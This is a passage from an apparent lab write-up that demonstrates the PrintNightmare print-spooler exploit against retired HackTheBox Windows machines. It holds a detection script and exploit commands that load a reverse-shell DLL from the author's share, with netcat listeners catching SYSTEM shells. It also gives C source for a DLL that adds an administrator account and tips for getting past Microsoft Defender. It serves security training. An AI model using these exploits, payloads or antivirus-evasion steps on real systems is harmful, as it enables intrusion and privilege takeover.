<p>As stated previously, I will be using HackTheBox retired machines as the targets. Here are the retired Windows machines that I will use along with their low privilege users.</p>
<div class="table-wrapper" >
<table>
<thead>
<tr>
<th style="text-align:center">Target</th>
<th style="text-align:center">IP</th>
<th style="text-align:center">Low Priv Credentials [username:password]</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Active</td>
<td style="text-align:center">10.10.10.100</td>
<td style="text-align:center"><code>svc_tgs:GPPstillStandingStrong2k18</code></td>
</tr>
<tr>
<td style="text-align:center">Bastion</td>
<td style="text-align:center">10.10.10.134</td>
<td style="text-align:center"><code>l4mpje:bureaulampje</code></td>
</tr>
<tr>
<td style="text-align:center">Heist</td>
<td style="text-align:center">10.10.10.149</td>
<td style="text-align:center"><code>hazard:stealth1agent</code></td>
</tr>
<tr>
<td style="text-align:center">Forest</td>
<td style="text-align:center">10.10.10.161</td>
<td style="text-align:center"><code>svc-alfresco:s3rvice</code></td>
</tr>
<tr>
<td style="text-align:center">Atom</td>
<td style="text-align:center">10.10.10.237</td>
<td style="text-align:center"><code>jason:kidvscat_electron_@123</code></td>
</tr>
</tbody>
</table>
</div>
<h2 id="target-scanning">Target Scanning</h2>
<p>According to <a href="https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html">this blog post</a> by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:</p>
<ol>
<li>Print Spooler Service enabled on the target system ❔</li>
<li>Network connectivity to the target system (initial access has been obtained)  ✔</li>
<li>Hash or password for a low privileged user (or computer) account  ✔</li>
</ol>
<p>Now to check if the Print Spooler service enabled, I could follow cube0x0&rsquo;s instruction by using a tool from impacket called <code>rpcdump.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ rpcdump.py @<span class="o">[</span>IP-ADDRESS<span class="o">]</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
</span></span></code></pre></div><p><code>rpcclient</code> can also be used to detect the availability of Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is <strong>&ldquo;Could not initialise spoolss&rdquo;</strong>, then the Print Spooler is most likely to be disabled.</p>
<p>The following is a dirty bash script I created as a wrapper for checking via <code>rpcdump.py</code> and <code>rpcclient</code> in one run.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">targets</span><span class="o">=</span><span class="nv">$1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$targets</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;[-] Usage\t: </span><span class="nv">$0</span><span class="s2"> [Target file]&#34;</span> 
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;[-] File format : &lt;ip&gt;:&lt;username&gt;:&lt;password&gt; | 127.0.0.1:foo:bar&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> target in <span class="sb">`</span>cat <span class="nv">$targets</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">		 <span class="nv">ip</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f1<span class="k">)</span>
</span></span><span class="line"><span class="cl">		 <span class="nv">username</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2<span class="k">)</span>
</span></span><span class="line"><span class="cl">		 <span class="nv">password</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f3<span class="k">)</span>
</span></span><span class="line"><span class="cl">		 <span class="nb">echo</span>  <span class="s2">&#34; - [</span><span class="nv">$ip</span><span class="s2">] - &#34;</span> 
</span></span><span class="line"><span class="cl">		 impacket-rpcdump <span class="nv">$ip</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
</span></span><span class="line"><span class="cl">		 rpcclient -U <span class="s2">&#34;</span><span class="nv">$username</span><span class="s2">%</span><span class="nv">$password</span><span class="s2">&#34;</span> <span class="nv">$ip</span> -c <span class="s2">&#34;enumprinters;quit&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="k">done</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span></code></pre></div><p>I saved the script as <code>detect-nightmare.sh</code> . I ran the script and it returned the following results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ./detect-nightmare.sh target-machines
</span></span><span class="line"><span class="cl"> - <span class="o">[</span>10.10.10.100<span class="o">]</span> - 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
</span></span><span class="line"><span class="cl">Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
</span></span><span class="line"><span class="cl"> - <span class="o">[</span>10.10.10.134<span class="o">]</span> - 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
</span></span><span class="line"><span class="cl">No printers returned.
</span></span><span class="line"><span class="cl"> - <span class="o">[</span>10.10.10.149<span class="o">]</span> - 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
</span></span><span class="line"><span class="cl">No printers returned.
</span></span><span class="line"><span class="cl"> - <span class="o">[</span>10.10.10.161<span class="o">]</span> - 
</span></span><span class="line"><span class="cl">Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
</span></span><span class="line"><span class="cl"> - <span class="o">[</span>10.10.10.237<span class="o">]</span> - 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
</span></span><span class="line"><span class="cl">No printers returned.
</span></span></code></pre></div><p>Based on the results above, Active and Forest don&rsquo;t seem to be vulnerable, but I will still test them out!</p>
<h2 id="exploitation-demo">Exploitation Demo</h2>
<h3 id="101010100-active">[10.10.10.100] Active</h3>
<p>As expected, on Active the exploit is failed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span>@10.10.10.100 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.100<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connection Failed
</span></span></code></pre></div><h3 id="101010134-bastion">[10.10.10.134] Bastion</h3>
<p>I ran the exploit against Bastion, and it connected but then the DLL got removed by AV 😂. I will re-exploit this in the <a href="#av-evasion">Troubleshoot</a> section</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py Bastion/l4mpje:<span class="s1">&#39;bureaulampje&#39;</span>@10.10.10.134 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.134<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_1734185bdb8f8610<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 1...
</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not <span class="nb">complete</span> successfully because the file contains a virus or potentially unwanted software
</span></span></code></pre></div><h3 id="101010134-heist">[10.10.10.134] Heist</h3>
<p>On Heist, the exploit didn&rsquo;t show any indication of a successful exploitation (I will look into this problem at <a href="#troubleshoot">Troubleshoot</a>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py heist/hazard:<span class="s1">&#39;stealth1agent&#39;</span>@10.10.10.149 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.149<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_83aa9aebf5dffc96<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 1...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 2...
</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
</span></span></code></pre></div><p>But strangely, I got a shell on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">4444</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.149<span class="o">]</span> <span class="m">49700</span>
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.437<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;hostname
</span></span><span class="line"><span class="cl">hostname
</span></span><span class="line"><span class="cl">SupportDesk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;ipconfig
</span></span><span class="line"><span class="cl">ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . : 
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.149
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span></code></pre></div><h3 id="101010161-forest">[10.10.10.161] Forest</h3>
<p>Like on Active, the exploit also failed on Forest</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py htb.local/svc-alfresco:<span class="s1">&#39;s3rvice&#39;</span>@10.10.10.161 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.161<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connection Failed
</span></span></code></pre></div><h3 id="101010237-atom">[10.10.10.237] Atom</h3>
<p>On Atom, the exploit returned the same result as on Heist, no indication of a successful exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 1...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 2...
</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
</span></span></code></pre></div><p>But then the DLL connected to my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">4444</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">62322</span>
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
</span></span><span class="line"><span class="cl">hostname
</span></span><span class="line"><span class="cl">ATOM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig
</span></span><span class="line"><span class="cl">ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . : 
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d
</span></span><span class="line"><span class="cl">   Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea
</span></span><span class="line"><span class="cl">   Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.237
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span></code></pre></div><h2 id="troubleshoot">Troubleshoot</h2>
<h4 id="status_pipe_closing">STATUS_PIPE_CLOSING</h4>
<p>I&rsquo;m sure that the following error is caused by my DLL payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)
</span></span></code></pre></div><p>This is probably because, instead of using the DLL to create a user (one time load / execution / thread / I don&rsquo;t know~), I use the DLL for reverse shell.</p>
<p><del>I wanted to generate my own payload to test but my Visual Studio somehow didn&rsquo;t want me to install the Windows SDK</del>  (Fixed on <a href="https://fahmifj.github.io/blog/me-vs-windows-permissions/">this post</a>).</p>
<p>Because I don&rsquo;t want to RE the DLL created with msfvenom, I steal <a href="https://github.com/fahmifj/PrintNightmare-kit/blob/main/generate-nightmaredll.ps1">this payload</a> from this <a href="https://github.com/calebstewart/CVE-2021-1675">PoC</a> created by Caleb Stewart and John Hammond.</p>
<script type="application/javascript" src="https://gist.github.com/fahmifj/f3f3166eba91e97aed7c16c88e1f76c0.js"></script>

<p>I can simply invoke <code>Get-NightmareDLL</code> within a PowerShell session to generate the DLL.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS /opt/PrintNightmare/dll&gt; Import-Module ./generate-nightmaredll.ps1
</span></span><span class="line"><span class="cl">PS /opt/PrintNightmare/dll&gt; Get-NightmareDLL
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Created payload at /opt/printnightmare/dll/nightmare.dll
</span></span></code></pre></div><p>I ran the exploit again on Atom, but this time it didn&rsquo;t crash, instead it showed the indication of a successful exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\nightmare.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\n</span>ightmare.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 1...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 2...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stage2: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Exploit Completed
</span></span></code></pre></div><p>Now I can login with credentials of  <code>adm1n:P@ssw0rd</code> (default credentials from the stolen DLL) using <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «dll» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.237 -u <span class="s1">&#39;adm1n&#39;</span> -p <span class="s1">&#39;P@ssw0rd&#39;</span>                                                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; whoami /groups <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;Administrators&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
</span></span><span class="line"><span class="cl">ATOM
</span></span></code></pre></div><h4 id="av-evasion">AV Evasion</h4>
<p>Another issue I ran into during the demo was that the payload got removed by Microsoft Defender on Bastion. Using a self compile DLL payload from <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">BookHackTrick</a> DLL templates can resolve this  (I should do this earlier 😅🔨).</p>
<p>The following is the template that I use.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own
</span></span></span><span class="line"><span class="cl"><span class="c1">// compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span><span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">Entry</span> <span class="p">(){</span> <span class="c1">//Default function that is executed when the DLL is loaded
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd.exe /c net user iamf &lt;password&gt; /add&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd.exe /c net localgroup administrators iamf /add&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">Entry</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The code can be compiled from Linux using <code>mingw-w64</code> compiler (<code>sudo apt install mingw-w64</code>). I will run the following command to compile the DLL.</p>
